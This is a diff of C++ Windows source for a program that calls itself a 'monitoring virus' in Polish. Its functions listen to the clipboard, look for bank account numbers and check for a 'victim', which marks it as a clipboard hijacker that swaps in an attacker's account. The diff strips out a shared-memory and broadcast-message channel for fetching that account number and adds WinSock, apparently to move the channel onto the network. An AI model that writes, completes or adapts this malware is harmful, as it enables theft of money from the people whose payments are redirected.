@@ -1,5 +1,6 @@
 ﻿#include <Windows.h>
 #include <time.h>
+#include <WinSock2.h>
 
 #define REQUEST_NUMBER	0xDEAD
 #define POST_NUMBER		0xBEEF
@@ -12,13 +13,11 @@ void MoveToCb();
 bool CheckIfAccountNumber(LPSTR str);
 void CheckForVictim();
 void SaveNumber(LONG_PTR num);
-void GLEMAS();
 
 constexpr CHAR szClassName[] = "WirusMonitorujacy";
 LPSTR bankAccount;
 HWND hwndThis;
 HWND hwndNextViewer;
-UINT messageCode;
 time_t start, current;
 bool bAset;
 
@@ -35,7 +34,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		if (diff >= 10.0)
 		{
 			// Wysłanie żądania do procesu nadawcy o konto bankowe
-			PostMessage(HWND_BROADCAST, messageCode, REQUEST_NUMBER, 0);
+			// TODO
 			time(&start);
 		}
 		TranslateMessage(&msg);
@@ -77,9 +76,6 @@ bool init(HINSTANCE hInstance)
 
 	if (hwndThis == NULL) return false;
 	if (!AddClipboardFormatListener(hwndThis)) return false;
-
-	messageCode = RegisterWindowMessage((LPCSTR)"Nic podejrzanego");
-	
 
 	bankAccount = (char*)calloc(MAXL + 1, sizeof(char));
 	bAset = false;
@@ -188,31 +184,5 @@ bool CheckIfAccountNumber(LPSTR str)
 
 void SaveNumber(LONG_PTR num)
 {
-	HANDLE hMem = OpenFileMapping(
-		FILE_MAP_ALL_ACCESS,
-		FALSE,
-		"Global\\FM_V"
-	);
-	if (hMem == NULL) GLEMAS();
-	LPCTSTR pBuf = (LPTSTR)MapViewOfFile(
-		hMem,
-		FILE_MAP_ALL_ACCESS,
-		0,
-		0,
-		MAXL + 1
-	);
-	if (pBuf == NULL) GLEMAS();
-	CopyMemory(bankAccount, (PVOID)pBuf, (MAXL + 1) * sizeof(CHAR));
 
-	UnmapViewOfFile(pBuf);
-	CloseHandle(hMem);
-}
-
-void GLEMAS()
-{
-	wchar_t buf[256];
-	FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
-		NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
-		buf, (sizeof(buf) / sizeof(wchar_t)), NULL);
-	int i = 0;
 }
